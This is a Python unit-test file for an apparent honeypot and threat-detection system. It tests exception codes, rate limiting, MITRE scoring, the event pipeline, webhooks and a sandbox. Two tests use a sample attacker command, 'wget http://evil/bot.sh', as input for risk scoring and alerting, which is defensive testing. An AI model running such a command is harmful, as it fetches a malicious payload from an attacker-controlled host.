"""Second batch of unit tests for low-coverage modules."""

from __future__ import annotations

import asyncio
import time
from types import SimpleNamespace

import pytest

from cloudsentinel import exceptions
from cloudsentinel.admin_api import (
    _latest_mttb_from_clickhouse,
    _load_attack_distribution_from_clickhouse,
    _load_attack_graph_from_clickhouse,
    _load_recent_events_from_clickhouse,
    _load_recent_sessions_from_clickhouse,
    _load_truth_summary_from_clickhouse,
)
from cloudsentinel.config import RedisSettings, load_settings
from cloudsentinel.dns_honeypot import DNSHoneypot
from cloudsentinel.event_codec import loads_text
from cloudsentinel.geoip import enrich, is_public_ip
from cloudsentinel.mitre import get_technique_info, score_auth_event, score_event
from cloudsentinel.pipeline import EventEnvelope, EventPipeline
from cloudsentinel.sandbox import DockerSandbox
from cloudsentinel.server import CloudSentinelSSHServer, ConnectionLimiter
from cloudsentinel.shell import HoneyPotInteractiveProtocol
from cloudsentinel.stress_test import StressTest
from cloudsentinel.stream import LiveStream
from cloudsentinel.validate_phase1 import tcp_check, write_artifacts
from cloudsentinel.vfs import VirtualFileSystem
from cloudsentinel.webhook import WebhookConfig, WebhookNotifier


def test_exception_hierarchy() -> None:
    error = exceptions.ConnectionRejectedError("1.2.3.4", "rate")
    assert error.code == "CS401"
    assert "1.2.3.4" in str(error)
    assert exceptions.SessionLimitExceededError(3, 5).code == "CS402"
    assert exceptions.FuzzDetectedError("1.2.3.4").code == "CS403"
    assert exceptions.AuthLimitExceededError("1.2.3.4", 21).code == "CS404"
    assert exceptions.SessionTimeoutError("abcdef123456", 30).code == "CS405"
    assert exceptions.ProtocolViolationError("1.2.3.4").code == "CS406"
    assert exceptions.BlockFailedError("1.2.3.4").code == "CS501"
    assert exceptions.BlockTimeoutError("1.2.3.4").code == "CS502"
    assert exceptions.RedisUnavailableError().code == "CS503"
    assert exceptions.AllowlistBlockError("1.2.3.4").code == "CS504"


def test_geoip_private_and_invalid() -> None:
    assert is_public_ip("8.8.8.8") is True
    assert is_public_ip("10.0.0.1") is False
    private = enrich("10.0.0.1")
    assert private["country_code"] == "PV"
    invalid = enrich("not-an-ip")
    assert invalid["country_code"] == "XX"


@pytest.mark.asyncio
async def test_validate_phase1_tcp_and_artifacts(tmp_path) -> None:
    async def handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        writer.close()
        await writer.wait_closed()

    server = await asyncio.start_server(handler, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    try:
        result = await tcp_check("127.0.0.1", port)
        assert result["ok"] is True
    finally:
        server.close()
        await server.wait_closed()
    report = {
        "generated_at": "2026-01-01T00:00:00Z",
        "target": "127.0.0.1",
        "overall_pass": True,
        "checks": {
            "ssh_honeypot": {"ok": True},
            "management_ssh": {"ok": True},
            "socketio": {"ok": True},
            "mitre_coverage": {"ok": True, "count": 20},
            "admin_readiness": {
                "redis_connected": True,
                "clickhouse_ok": True,
                "stream_enabled": True,
            },
        },
    }
    write_artifacts(report, tmp_path)
    assert (tmp_path / "phase1-validation.json").exists()
    assert (tmp_path / "phase1-validation.md").exists()


def test_dns_rate_limit() -> None:
    honeypot = DNSHoneypot(max_queries_per_ip=2, rate_window_seconds=60)
    assert honeypot._check_rate_limit("1.2.3.4") is True
    assert honeypot._check_rate_limit("1.2.3.4") is True
    assert honeypot._check_rate_limit("1.2.3.4") is False
    assert "1.2.3.4" in honeypot._blocked_ips


@pytest.mark.asyncio
async def test_stream_init_and_emit() -> None:
    stream = LiveStream(cors_origin="*")
    assert stream._cors_origins == "*"
    stream.emit({"eventid": "test"})
    assert stream._buffer == stream._buffer

    class FakeSio:
        def __init__(self) -> None:
            self.events: list[tuple[str, dict]] = []

        async def emit(self, event: str, payload: dict) -> None:
            self.events.append((event, payload))

    stream._sio = FakeSio()
    stream._started = True
    await stream.emit_coro({"eventid": "test", "system": "hidden"})
    assert stream._sio.events[0][0] == "cloudsentinel:event"
    assert "system" not in stream._sio.events[0][1]


@pytest.mark.asyncio
async def test_webhook_disabled_and_payload() -> None:
    notifier = WebhookNotifier(WebhookConfig(enabled=False))
    try:
        assert await notifier.send_alert({"src_ip": "1.2.3.4"}) == []
        notifier.config.enabled = True
        event = {
            "src_ip": "1.2.3.4",
            "cloudsentinel_risk_score": 80,
            "cloudsentinel_mitre_techniques": ["T1105"],
            "cloudsentinel_soar_action": "iptables_block",
            "username": "root",
            "input": "wget http://evil/bot.sh",
        }
        payload = notifier._format_payload(event)
        assert payload["ip"] == "1.2.3.4"
        assert "T1105" in payload["techniques"]
    finally:
        await notifier.close()


def test_mitre_auth_and_honeytoken() -> None:
    result = score_auth_event("root", 6, "password")
    assert "T1110" in result["mitre_techniques"]
    assert "T1078" in result["mitre_techniques"]
    assert get_technique_info("T1105")["name"]
    honeytoken = score_event("cloudsentinel.honeytoken.access", {})
    assert honeytoken["risk_score"] == 85
    assert honeytoken["mitre_techniques"] == ["T1555"]
    assert score_event("unknown.event", {})["risk_score"] == 0


@pytest.mark.asyncio
async def test_pipeline_annotate_and_optional_publish() -> None:
    pipeline = EventPipeline(RedisSettings())
    annotation = pipeline._annotate_command("session-1", "wget http://evil/bot.sh")
    assert annotation["risk_score"] > 0
    envelope = EventEnvelope(
        event_type="cloudsentinel.command.input",
        session_id="session-1",
        src_ip="8.8.8.8",
        src_port=1,
        timestamp=time.time(),
        payload={"eventid": "cloudsentinel.command.input"},
    )
    assert loads_text(envelope.to_message_bytes())["session_id"] == "session-1"

    class FakeNats:
        def __init__(self) -> None:
            self.published = None

        async def publish(self, subject: str, payload: bytes) -> None:
            self.published = (subject, payload)

    class FakeKafka:
        def __init__(self) -> None:
            self.published = None

        async def send_and_wait(self, topic: str, payload: bytes) -> None:
            self.published = (topic, payload)

    pipeline._nats = FakeNats()
    pipeline._kafka = FakeKafka()
    await pipeline._publish_optional(envelope)
    assert pipeline._nats.published is not None
    assert pipeline._kafka.published is not None


def test_admin_clickhouse_disabled_loaders() -> None:
    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    settings.clickhouse.enabled = False
    assert _load_recent_sessions_from_clickhouse(settings) == []
    assert _load_recent_events_from_clickhouse(settings) == []
    assert _latest_mttb_from_clickhouse(settings) == 0.0
    assert _load_attack_distribution_from_clickhouse(settings) == {
        "Brute Force": 0,
        "Command Injection": 0,
        "Port Scanning": 0,
        "Malware Upload": 0,
    }
    assert _load_attack_graph_from_clickhouse(settings) == {"nodes": [], "edges": []}
    assert _load_truth_summary_from_clickhouse(settings) is None


def test_server_session_methods(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("cloudsentinel.server.geo_enrich", lambda _ip: {})
    settings = SimpleNamespace(
        fingerprinting=SimpleNamespace(enable_hassh=False, enable_ja4s=False),
        honeypot=SimpleNamespace(server_version="SSH-2.0-test", hostname="unit-host"),
    )
    server = CloudSentinelSSHServer(
        settings=settings,
        pipeline=SimpleNamespace(),
        soar=SimpleNamespace(),
        hassh_dna=SimpleNamespace(),
        limiter=ConnectionLimiter(),
    )
    server.conn = SimpleNamespace(get_extra_info=lambda *_args: "")
    server._accepted = True
    assert server.begin_auth("root") is True
    assert server.validate_password("root", "password") is True
    assert server._auth_attempts == 1
    event = server._build_base_event("unit.event", {"input": "whoami"})
    assert event["eventid"] == "unit.event"
    assert event["session"] == server.session_id


@pytest.mark.asyncio
async def test_legacy_docker_sandbox(monkeypatch: pytest.MonkeyPatch) -> None:
    class FakeProc:
        returncode = 0

        async def communicate(self) -> tuple[bytes, bytes]:
            return b"ok", b""

    async def fake_exec(*args: str, **_kwargs: object) -> FakeProc:
        assert "docker" in args
        assert "--network" in args
        return FakeProc()

    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
    code, output = await DockerSandbox().execute("whoami", "~")
    assert code == 0
    assert output == "ok"


def test_stress_test_init() -> None:
    test = StressTest("127.0.0.1", 2222, 5, delay=0.01)
    assert test.host == "127.0.0.1"
    assert test.port == 2222
    assert test.count == 5
    assert test.MALICIOUS_CMDS


def test_shell_init() -> None:
    vfs = VirtualFileSystem.build_default()
    protocol = HoneyPotInteractiveProtocol(
        transport=SimpleNamespace(),
        vfs=vfs,
        username="root",
        hostname="unit-host",
        ip="8.8.8.8",
    )
    assert protocol.username == "root"
    assert protocol.hostname == "unit-host"
    assert protocol.clientIP == "8.8.8.8"
